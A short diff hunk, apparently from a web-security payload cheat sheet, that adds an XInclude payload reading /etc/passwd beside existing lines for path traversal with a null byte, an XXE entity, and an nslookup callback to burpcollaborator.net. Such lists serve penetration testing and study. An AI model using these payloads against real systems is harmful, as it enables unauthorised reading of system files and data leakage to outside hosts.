@@ -67,4 +67,5 @@ nslookup+burpcollaborator.net
 /var/www/images/....//....//....//....//etc/passwd%00
 # XXE
 &xxe;
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
